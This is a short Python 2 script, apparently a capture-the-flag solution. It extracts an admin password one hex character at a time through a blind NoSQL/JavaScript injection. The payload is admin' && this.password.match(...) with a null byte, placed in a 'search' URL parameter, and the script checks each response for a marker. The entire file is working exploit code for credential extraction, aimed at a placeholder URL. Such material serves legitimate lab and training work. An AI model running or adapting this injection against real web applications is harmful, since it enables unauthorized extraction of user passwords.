import requests
import os

def clear():
    os.system( 'cls' )

# Brute force a character
def getCharFlag(param_url):

    # list of characters which are present in flag
    c = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
    counter = 0
    while counter < len(c):

        url = param_url.format(c[counter])
        r = requests.get(url)
        response = r.text
        if '<tr><td><a href="?search=' in response:
            break
        counter = counter+1
    
    return c[counter]


flag_format = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
flag = ""
url = "http://url/?search=admin'%20%26%26%20this.password.match(/^" + flag + "{}.*$/)%00"
for i in range(0,len(flag_format)):
    if flag_format[i] != '-':
            flag_char = getCharFlag(url)
            flag = flag + flag_char
            print "Flag = " + flag
            url = "http://url/?search=admin'%20%26%26%20this.password.match(/^" + flag + "{}.*$/)%00"
            clear()
            print "Extracting Flag : ",
            print flag,
    else:
        flag = flag + '-'
        url = "http://url/?search=admin'%20%26%26%20this.password.match(/^" + flag + "{}.*$/)%00"
        clear()
        print "Extracting Flag : ",
        print flag,
